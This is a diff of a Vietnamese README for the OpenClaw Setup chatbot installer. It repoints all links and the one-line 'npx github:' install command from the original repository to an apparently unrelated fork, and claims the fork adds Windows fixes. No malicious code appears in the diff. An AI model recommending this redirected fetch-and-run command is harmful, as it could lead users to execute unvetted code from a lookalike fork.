@@ -7,10 +7,9 @@
 *Chạy một lệnh, mở dashboard, bot lên sóng. Windows, macOS, Linux, VPS. Bot chạy thẳng trên máy, không cần Docker.*
 
 <p align="center">
-  <a href="https://github.com/tuanminhhole/openclaw-setup/releases"><img src="https://img.shields.io/badge/RELEASE-v5.18.3-0EA5E9?style=for-the-badge" alt="Version 5.18.3" /></a>
-  <a href="https://github.com/tuanminhhole/openclaw-setup?tab=MIT-1-ov-file"><img src="https://img.shields.io/badge/LICENSE-MIT-success?style=for-the-badge" alt="MIT License" /></a>
-  <a href="https://www.npmjs.com/package/create-openclaw-bot"><img src="https://img.shields.io/npm/v/create-openclaw-bot?style=for-the-badge&label=CLI&color=2563EB&logo=npm&logoColor=white" alt="NPM Version" /></a>
-  <a href="https://github.com/tuanminhhole/openclaw-setup/stargazers"><img src="https://img.shields.io/github/stars/tuanminhhole/openclaw-setup?style=for-the-badge&color=eab308&logo=github&logoColor=white" alt="GitHub Stars" /></a>
+  <a href="https://github.com/dangthanhhung61-dotcom/openclaw-setup-main-8/releases"><img src="https://img.shields.io/badge/RELEASE-v5.18.3-0EA5E9?style=for-the-badge" alt="Version 5.18.3" /></a>
+  <a href="https://github.com/dangthanhhung61-dotcom/openclaw-setup-main-8?tab=MIT-1-ov-file"><img src="https://img.shields.io/badge/LICENSE-MIT-success?style=for-the-badge" alt="MIT License" /></a>
+  <a href="https://github.com/dangthanhhung61-dotcom/openclaw-setup-main-8/stargazers"><img src="https://img.shields.io/github/stars/dangthanhhung61-dotcom/openclaw-setup-main-8?style=for-the-badge&color=eab308&logo=github&logoColor=white" alt="GitHub Stars" /></a>
 </p>
 
 ![Tiếng Việt](https://flagcdn.com/20x15/vn.png) **Tiếng Việt** · [![English](https://flagcdn.com/20x15/gb.png) English](README.md)
@@ -18,9 +17,9 @@
 > 🇻🇳 Mã nguồn mở & miễn phí. Dashboard tự động hóa 100% việc tạo dự án, triển khai và quản lý bot AI trên **Telegram · Zalo · Facebook Messenger** (Discord & Lark sắp ra mắt) - cài trong vài phút, không cần biết code.
 
 <p align="center" style="margin: 24px 0;">
-  <img src="https://raw.githubusercontent.com/tuanminhhole/openclaw-setup/main/docs/openclaw-setup-vi.png" alt="OpenClaw Setup" width="90%" style="border-radius: 8px; border: 1px solid #333; margin-bottom: 16px;" />
-  <img src="https://raw.githubusercontent.com/tuanminhhole/openclaw-setup/main/docs/dashboard-vi.png" alt="OpenClaw Dashboard" width="90%" style="border-radius: 8px; border: 1px solid #333; margin-bottom: 16px;" />
-  <img src="https://raw.githubusercontent.com/tuanminhhole/openclaw-setup/main/docs/bot.png" alt="OpenClaw Bot in Action" width="90%" style="border-radius: 8px; border: 1px solid #333;" />
+  <img src="https://raw.githubusercontent.com/dangthanhhung61-dotcom/openclaw-setup-main-8/main/docs/openclaw-setup-vi.png" alt="OpenClaw Setup" width="90%" style="border-radius: 8px; border: 1px solid #333; margin-bottom: 16px;" />
+  <img src="https://raw.githubusercontent.com/dangthanhhung61-dotcom/openclaw-setup-main-8/main/docs/dashboard-vi.png" alt="OpenClaw Dashboard" width="90%" style="border-radius: 8px; border: 1px solid #333; margin-bottom: 16px;" />
+  <img src="https://raw.githubusercontent.com/dangthanhhung61-dotcom/openclaw-setup-main-8/main/docs/bot.png" alt="OpenClaw Bot in Action" width="90%" style="border-radius: 8px; border: 1px solid #333;" />
 </p>
 
 </div>
@@ -227,42 +226,36 @@
 Mở terminal và chạy đúng một lệnh (chạy trên macOS, Linux & Windows - cần Node.js 24 LTS):
 
 ```bash
-npx create-openclaw-bot
+npx github:dangthanhhung61-dotcom/openclaw-setup-main-8
 ```
 
-Lệnh này tự tải wizard, chạy server và **mở giao diện Setup** trên trình duyệt tại **http://127.0.0.1:51789**.
+Lệnh này tải Setup thẳng từ repo này trên GitHub, chạy server và **mở giao diện Setup** trên trình duyệt tại **http://127.0.0.1:51789**.
 
-### 2️⃣ Cách 2 - Chạy mã mới nhất trực tiếp từ GitHub
-
-Dùng cách này nếu bạn muốn lấy code mới nhất trực tiếp từ GitHub:
-
-```bash
-npx github:tuanminhhole/openclaw-setup
-```
-
+> Bản này **chưa có trên npm**: lệnh `npx create-openclaw-bot` cài bản gốc 5.18.3, không có các bản sửa Windows của repo này.
+>
 > **Cách này bắt buộc máy phải cài Git.** Hãy cài [Git](https://git-scm.com/downloads) và kiểm tra lệnh `git` chạy được trong terminal trước; nếu thiếu Git, npm không thể tải repository từ GitHub.
 
-### 3️⃣ Cách 3 - Clone thủ công (dành cho developer)
+### 2️⃣ Cách 2 - Clone thủ công (dành cho developer)
 
 Dành cho người muốn lấy full source. Chạy lần lượt từng dòng:
 
 ```bash
-git clone https://github.com/tuanminhhole/openclaw-setup.git
-cd openclaw-setup
+git clone https://github.com/dangthanhhung61-dotcom/openclaw-setup-main-8.git
+cd openclaw-setup-main-8
 npm install
 npm start
 ```
 
 Sau đó mở **http://127.0.0.1:51789** nếu trình duyệt không tự bật.
 
-> ⚠️ `npm install` / `npm start` **chỉ chạy được khi bạn đang ở trong thư mục `openclaw-setup` đã clone**. Nếu dùng một trong hai cách npx, lần sau chỉ cần chạy lại đúng lệnh npx đó để mở Setup.
+> ⚠️ `npm install` / `npm start` **chỉ chạy được khi bạn đang ở trong thư mục `openclaw-setup-main-8` đã clone**. Nếu dùng cách npx, lần sau chỉ cần chạy lại đúng lệnh npx đó để mở Setup.
 
 ### 🔁 Mở lại giao diện sau này
 
-Chạy lại lệnh khuyên dùng. Setup sẽ tự nhận diện và mở project hiện có:
+Chạy lại lệnh khuyên dùng (trên Windows: bấm biểu tượng **Bot OpenClaw** trên Desktop rồi chọn **Mở giao diện quản trị**). Setup sẽ tự nhận diện và mở project hiện có:
 
 ```bash
-npx create-openclaw-bot
+npx github:dangthanhhung61-dotcom/openclaw-setup-main-8
 ```
 
 ### ⬆️ Cập nhật lên phiên bản mới
@@ -373,8 +366,8 @@ Hoàn toàn được. Bạn có thể sửa trực tiếp file `openclaw.json` �
 
 <div align="center">
 
-<a href="https://github.com/tuanminhhole/openclaw-setup/stargazers"><img src="https://img.shields.io/github/stars/tuanminhhole/openclaw-setup?style=for-the-badge&logo=github&color=eab308" alt="GitHub Stars" /></a>
-<a href="https://github.com/tuanminhhole/openclaw-setup/forks"><img src="https://img.shields.io/github/forks/tuanminhhole/openclaw-setup?style=for-the-badge&logo=github&color=0ea5e9" alt="GitHub Forks" /></a>
+<a href="https://github.com/dangthanhhung61-dotcom/openclaw-setup-main-8/stargazers"><img src="https://img.shields.io/github/stars/dangthanhhung61-dotcom/openclaw-setup-main-8?style=for-the-badge&logo=github&color=eab308" alt="GitHub Stars" /></a>
+<a href="https://github.com/dangthanhhung61-dotcom/openclaw-setup-main-8/forks"><img src="https://img.shields.io/github/forks/dangthanhhung61-dotcom/openclaw-setup-main-8?style=for-the-badge&logo=github&color=0ea5e9" alt="GitHub Forks" /></a>
 
 </div>
 
@@ -401,7 +394,7 @@ Mọi góp ý / PR cải tiến đều được hoan nghênh. Nếu thấy hữu
 Các repo đi kèm để bạn dựng một trợ lý AI "tự vận hành" hoàn chỉnh:
 
 **🚀 Cài đặt & khung nền**
-- [openclaw-setup](https://github.com/tuanminhhole/openclaw-setup) - *(repo này)* Setup bot AI miễn phí bằng OpenClaw + 9Router (Telegram/Zalo/Messenger, Docker)
+- [openclaw-setup](https://github.com/tuanminhhole/openclaw-setup) - *(bản gốc của repo này)* Setup bot AI miễn phí bằng OpenClaw + 9Router (Telegram/Zalo/Messenger, Docker)
 - [vietbrain](https://github.com/tuanminhhole/vietbrain) - Bộ khung "Bộ Não Thứ Hai" tiếng Việt cho Obsidian (sẵn sàng AI)
 
 **🔌 Plugin (runtime)**
